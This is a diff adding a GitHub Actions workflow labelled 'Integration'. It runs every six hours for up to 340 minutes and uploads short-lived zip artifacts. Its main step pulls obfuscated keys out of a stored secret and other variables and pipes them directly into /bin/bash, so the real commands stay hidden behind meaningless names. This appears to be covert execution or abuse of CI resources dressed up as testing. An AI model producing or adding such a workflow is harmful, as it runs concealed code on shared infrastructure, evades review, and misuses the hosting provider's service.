@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 2,8,14,20 * * *'
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          xj1: ${{ secrets.xj1 }}
+        run: |
+          printf '%s' "$xj1" | jq -r .wbcp088 | /bin/bash
+          printf '%s' "$ylvzd5958" | jq -r .jxz55 | /bin/bash
+          echo $ltbd88191 | jq -r .qrxaq49043 | /bin/bash
+          printf '%s' "$hu7" | jq -r .wgi34 | /bin/bash
+          echo $lki669 | jq -r .p79 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: D3XGN80i
+          path: "*.zip"
+          retention-days: 1
